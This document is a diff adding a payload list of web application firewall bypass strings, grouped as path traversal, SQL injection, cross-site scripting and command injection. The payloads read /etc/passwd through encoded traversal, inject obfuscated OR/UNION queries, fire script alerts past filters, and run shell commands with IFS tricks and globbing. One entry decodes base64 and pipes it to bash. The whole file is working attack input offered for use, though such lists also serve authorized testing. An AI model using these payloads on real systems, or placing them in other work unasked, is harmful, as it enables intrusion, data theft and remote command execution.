@@ -1,0 +1,45 @@
+# Generic WAF bypass techniques - encoding chains
+# LFI bypasses
+....//....//....//....//etc/passwd
+..;/..;/..;/..;/etc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd
+....\/....\/....\/....\/etc/passwd
+..%bg%qf..%bg%qf..%bg%qfetc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+# SQLi bypasses
+'%20oR%20'1'='1
+'/**/OR/**/1=1--
+'/*!50000OR*/1=1--
+'%0aOR%0a'1'='1
+UniOn%20SeLeCt%20NULL--
+un%69on+se%6cect+1,2,3--
+UNION%0aSELECT%0aNULL--
+%55%4e%49%4f%4e%20%53%45%4c%45%43%54
+# XSS bypasses
+<svg/onload=alert(1)>
+<img src=x onerror=alert`1`>
+<details/open/ontoggle=alert`1`>
+<math><mi//xlink:href="javascript:alert(1)">
+<iframe/src="data:text/html,<script>alert(1)</script>">
+"><img src=x onerror=alert(1)//
+'-alert(1)-'
+\'-alert(1)//
+</script><svg onload=alert(1)>
+# RCE bypasses
+;${IFS}id
+|${IFS}id
+;$IFS'i''d'
+;{id,}
+;/???/??
+;/???/???
+;cat</etc/passwd
+;cat$IFS/etc/passwd
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;ca\t /etc/passwd
+;/bin/c?t /etc/passwd
+;base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk|bash
